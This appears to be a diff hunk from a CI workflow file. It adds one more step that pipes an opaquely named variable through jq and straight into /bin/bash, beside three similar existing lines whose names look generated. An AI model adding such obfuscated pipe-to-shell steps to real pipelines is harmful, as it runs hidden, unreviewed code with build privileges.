@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$d6041" | jq -r .m68085 | /bin/bash
           echo $pzbm527 | jq -r .m4 | /bin/bash
           echo $zzdb180 | jq -r .cocz8322 | /bin/bash
+          echo $qmp706 | jq -r .cgev35 | /bin/bash
 
       - name: Save output
         if: always()
